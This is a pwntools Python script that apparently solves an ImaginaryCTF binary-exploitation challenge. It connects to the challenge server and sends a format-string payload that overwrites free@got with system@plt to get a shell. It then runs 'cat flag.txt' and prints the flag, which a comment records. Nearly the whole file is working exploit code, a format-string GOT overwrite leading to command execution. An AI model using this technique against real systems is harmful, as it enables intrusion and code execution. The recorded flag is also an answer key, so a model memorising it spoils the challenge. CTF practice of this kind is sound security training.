from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# io = process("./vuln")
io = remote("puzzler7.imaginaryctf.org", 20000)
# io = gdb.debug("./vuln", "gef config context.nb_lines_stack 40\nb *(main+109)\nc")
io.recvline()
# write an free@got on the stack
# then write system@plt to free@got
io.sendline(b"sh;%c%c%c%c%4210705c%n%53288c%38$hnEND")
io.sendline(b"echo done")
io.recvuntil(b"done\n")
io.sendline(b"cat flag.txt")
print(io.recvlineS().strip())

# ictf{stack_control_with_format_string!}
